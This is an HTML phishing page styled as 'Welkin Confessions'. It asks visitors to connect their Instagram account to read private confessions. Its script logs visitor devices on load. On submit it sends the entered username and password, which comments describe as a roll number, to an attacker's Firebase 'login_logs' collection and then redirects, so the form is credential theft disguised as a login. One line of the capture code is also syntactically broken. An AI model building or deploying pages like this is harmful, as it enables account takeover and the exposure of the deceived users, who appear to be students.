<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welkin Confessions</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Poppins',sans-serif; }

body {
  height:100vh; overflow:hidden;
  display:flex; justify-content:center; align-items:center;
  background:black;
}

#bgVideo {
  position:fixed; top:0; left:0;
  width:100%; height:100%;
  object-fit:cover; z-index:-2;
}

.overlay {
  position:fixed; inset:0;
  background:rgba(0,0,0,.45); z-index:-1;
}

.card {
  width:380px; padding:30px;
  text-align:center;
  background:transparent; border:none;
}

.logo {
  width:95px; height:95px; border-radius:50%;
  object-fit:cover;
  border:3px solid rgba(255,255,255,.15);
  margin-bottom:10px;
}

.fire {
  font-size:32px; font-weight:900; color:white;
  margin-bottom:15px;
  animation:blueFlame 1s infinite alternate;
}

@keyframes blueFlame {
  0%   { text-shadow:0 0 5px #00bfff,0 0 15px #009dff,0 0 25px #0066ff; }
  100% { text-shadow:0 0 10px #66d9ff,0 0 25px #00bfff,0 0 45px #0066ff; }
}

.subtitle {
  font-size:14px; color:#f0f0f0;
  margin-bottom:20px; line-height:1.5;
}

.input-box { position:relative; width:100%; }

.icon {
  position:absolute; left:15px; top:50%;
  transform:translateY(-50%);
  color:#bfbfbf; font-size:16px; z-index:10;
}

.input {
  width:100%; padding:14px 14px 14px 45px;
  border:2px solid transparent; outline:none;
  border-radius:12px;
  background:rgba(255,255,255,.12);
  backdrop-filter:blur(8px);
  color:white; font-size:15px;
  transition:all 0.3s ease;
}

.input::placeholder { color:#d0d0d0; }

.input.error-glow {
  border-color:#ff3b30;
  background:rgba(255,59,48,0.15);
  box-shadow:0 0 10px rgba(255,59,48,0.4);
}

.remember {
  display:flex; justify-content:flex-end; align-items:center;
  gap:6px; margin:12px 0 18px;
  color:white; font-size:14px;
}

.btn {
  width:100%; padding:14px; border:none;
  border-radius:12px; cursor:pointer;
  font-size:15px; font-weight:700; color:white;
  background:linear-gradient(90deg,#00bfff,#0066ff);
  animation:blueFlame 1s infinite alternate;
}

.btn:disabled { opacity:0.7; cursor:not-allowed; animation:none; background:#444; }

.note {
  margin-top:15px; font-size:13px;
  font-weight:600; color:#00bfff;
}

.music-btn {
  position:fixed; bottom:15px; right:15px;
  width:45px; height:45px; border:none;
  border-radius:50%; cursor:pointer;
  font-size:18px; background:white;
}

.music-popup {
  position:fixed; bottom:70px; right:15px;
  background:rgba(0,0,0,.92); padding:12px;
  border-radius:12px; display:flex;
  align-items:center; gap:8px;
  color:white; font-size:13px; z-index:9999;
  max-width:260px;
}

.music-popup button {
  border:none; padding:6px 10px; border-radius:8px;
  cursor:pointer; background:#00bfff; color:white;
}

.alert-toast {
  position:fixed; top:-100px; left:50%;
  transform:translateX(-50%);
  background:rgba(20,20,20,0.95);
  border-left:4px solid #ff3b30;
  padding:14px 24px; border-radius:8px;
  color:white; font-size:14px; font-weight:500;
  z-index:10000; box-shadow:0 10px 30px rgba(0,0,0,0.5);
  display:flex; align-items:center; gap:10px;
  transition:top 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
  white-space:nowrap;
}
.alert-toast.show { top:20px; }
.alert-toast i { color:#ff3b30; font-size:16px; }
</style>
</head>

<body>

<video id="bgVideo" autoplay muted loop>
  <source src="background.mp4" type="video/mp4">
</video>
<div class="overlay"></div>

<div class="alert-toast" id="alertToast">
  <i class="fa-solid fa-circle-exclamation"></i>
  <span id="alertMsg">Please fill in all credentials.</span>
</div>

<div class="music-popup" id="musicPopup">
  Music for a better experience
  <button onclick="playMusic()">Play</button>
  <button onclick="closePopup()">X</button>
</div>

<div class="card">
  <img src="https://i.postimg.cc/3rvtPKLQ/IMG-20260611-210556-394.jpg" class="logo">
  <div class="fire">WELKIN CONFESSIONS</div>
  <div class="subtitle">Connect your Insta Account<br>to access private confessions</div>

  <div class="input-box">
    <i class="fa-solid fa-user icon"></i>
    <input type="text" class="input" id="username" placeholder="Username" autocomplete="off">
  </div>

  <div style="height:12px;"></div>

  <div class="input-box">
    <i class="fa-solid fa-lock icon"></i>
    <input type="password" class="input" id="password" placeholder="Password">
  </div>

  <div class="remember">
    <input type="checkbox" id="rememberMe">
    <span>Remember Me</span>
  </div>

  <button class="btn" id="loginBtn" onclick="login()">Connect Account</button>
  <div class="note">Verified Persons Only</div>
</div>

<button class="music-btn" onclick="toggleMusic()">&#9835;</button>
<audio id="music" src="music.mp3" loop></audio>

<!-- ═══════════════════════════════════════════
     FIREBASE — visitor tracking + login logging
     Everything is inside one module so there
     are zero timing / scope issues.
════════════════════════════════════════════ -->
<script type="module">
  import { initializeApp }   from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import {
    getFirestore, collection, doc,
    getDoc, setDoc, updateDoc,
    addDoc, increment, serverTimestamp
  } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

  /* ── Firebase config ── */
  const app = initializeApp({
    apiKey:            "AIzaSyBFZYXN5MJ9WOMBXfCchUWnR9LEfOOzImw",
    authDomain:        "welkin-b3fee.firebaseapp.com",
    projectId:         "welkin-b3fee",
    storageBucket:     "welkin-b3fee.firebasestorage.app",
    messagingSenderId: "45894924521",
    appId:             "1:45894924521:web:ab81de1a168022ba1d9878"
  });
  const db = getFirestore(app);

  /* ── Device detection ── */
  function getDevice() {
    const ua = navigator.userAgent;
    if (/POCO/i.test(ua))            return "POCO";
    if (/Redmi/i.test(ua))           return "Redmi";
    if (/Samsung/i.test(ua))         return "Samsung";
    if (/iPhone/i.test(ua))          return "iPhone";
    if (/iPad/i.test(ua))            return "iPad";
    if (/OnePlus/i.test(ua))         return "OnePlus";
    if (/OPPO/i.test(ua))            return "OPPO";
    if (/Vivo/i.test(ua))            return "Vivo";
    if (/Realme/i.test(ua))          return "Realme";
    if (/Nokia/i.test(ua))           return "Nokia";
    if (/Motorola|moto\s/i.test(ua)) return "Motorola";
    if (/Windows/i.test(ua))         return "Windows PC";
    if (/Macintosh/i.test(ua))       return "Mac";
    if (/Linux/i.test(ua))           return "Linux PC";
    if (/Android/i.test(ua))         return "Android Phone";
    return "Unknown Device";
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua))     return "Android";
    if (/iPhone|iPad/i.test(ua)) return "iOS";
    if (/Windows/i.test(ua))     return "Windows";
    if (/Mac/i.test(ua))         return "macOS";
    if (/Linux/i.test(ua))       return "Linux";
    return "Unknown";
  }

  const DEVICE = getDevice();
  const OS     = getOS();

  /* ════════════════════════════════════════
     1.  VISITOR TRACKING
     Fires once per browser per calendar day.
     Saves to:
       admin_stats/visitors  →  total count + per-device count
       visitor_logs          →  individual log row
  ════════════════════════════════════════ */
  async function trackVisitor() {
    const key = "welkin_visited_" + new Date().toDateString();
    if (sessionStorage.getItem(key)) return;   // already tracked today
    sessionStorage.setItem(key, "1");

    try {
      const statsRef = doc(db, "admin_stats", "visitors");
      const snap     = await getDoc(statsRef);

      if (snap.exists()) {
        // document already exists — just increment
        await updateDoc(statsRef, {
          total:                   increment(1),
          [`devices.${DEVICE}`]:   increment(1)
        });
      } else {
        // first ever visitor — create the document
        await setDoc(statsRef, {
          total:   1,
          devices: { [DEVICE]: 1 }
        });
      }

      // individual visit log (always saved regardless of dedup)
      await addDoc(collection(db, "visitor_logs"), {
        device:    DEVICE,
        os:        OS,
        userAgent: navigator.userAgent.substring(0, 250),
        timestamp: serverTimestamp()
      });

    } catch (e) {
      console.error("Visitor tracking failed:", e);
    }
  }

  /* ════════════════════════════════════════
     2.  LOGIN CAPTURE
     Saves username + roll number (password)
     to login_logs every time someone logs in.
  ════════════════════════════════════════ */
  async function captureLogin(username, password) {
    try {
      await addDoc(collection(db, "login_logs"), {
        username:  username,
        password:  roll no,      // roll number IS the password
        device:    DEVICE,
        os:        OS,
        timestamp: serverTimestamp()
      });
    } catch (e) {
      console.error("Login capture failed:", e);
    }
  }

  /* ── Expose captureLogin to the plain script below ── */
  window._captureLogin = captureLogin;

  /* ── Run visitor tracking immediately on page load ── */
  trackVisitor();
</script>

<!-- Plain script handles UI + calls Firebase via window._captureLogin -->
<script>
  function login() {
    const userEl = document.getElementById("username");
    const passEl = document.getElementById("password");
    const btn    = document.getElementById("loginBtn");

    userEl.classList.remove("error-glow");
    passEl.classList.remove("error-glow");

    const username = userEl.value.trim();
    const password = passEl.value.trim();

    /* ── Validation ── */
    if (!username && !password) {
      userEl.classList.add("error-glow");
      passEl.classList.add("error-glow");
      showToast("Please enter your Username and Password.");
      return;
    }
    if (!username) {
      userEl.classList.add("error-glow");
      userEl.focus();
      showToast("Username cannot be blank.");
      return;
    }
    if (!password) {
      passEl.classList.add("error-glow");
      passEl.focus();
      showToast("Roll Number cannot be blank.");
      return;
    }

    /* ── Save to Firebase then redirect ── */
    btn.disabled    = true;
    btn.innerText   = "Connecting...";

    // Fire-and-forget: save login, then redirect whether it succeeds or not
    const capture = window._captureLogin
      ? window._captureLogin(username, password)
      : Promise.resolve();

    capture.finally(() => {
      window.location.href = "home.html";
    });
  }

  function showToast(msg) {
    document.getElementById("alertMsg").innerText = msg;
    const t = document.getElementById("alertToast");
    t.classList.add("show");
    setTimeout(() => t.classList.remove("show"), 3500);
  }

  /* Clear error glow when user types */
  document.getElementById("username").addEventListener("input", function(){ this.classList.remove("error-glow"); });
  document.getElementById("password").addEventListener("input", function(){ this.classList.remove("error-glow"); });

  /* Enter key support */
  document.addEventListener("keydown", e => { if (e.key === "Enter") login(); });

  function toggleMusic() {
    const m = document.getElementById("music");
    m.paused ? m.play() : m.pause();
  }
  function playMusic() {
    document.getElementById("music").play();
    document.getElementById("musicPopup").style.display = "none";
  }
  function closePopup() {
    document.getElementById("musicPopup").style.display = "none";
  }
</script>

</body>
</html>
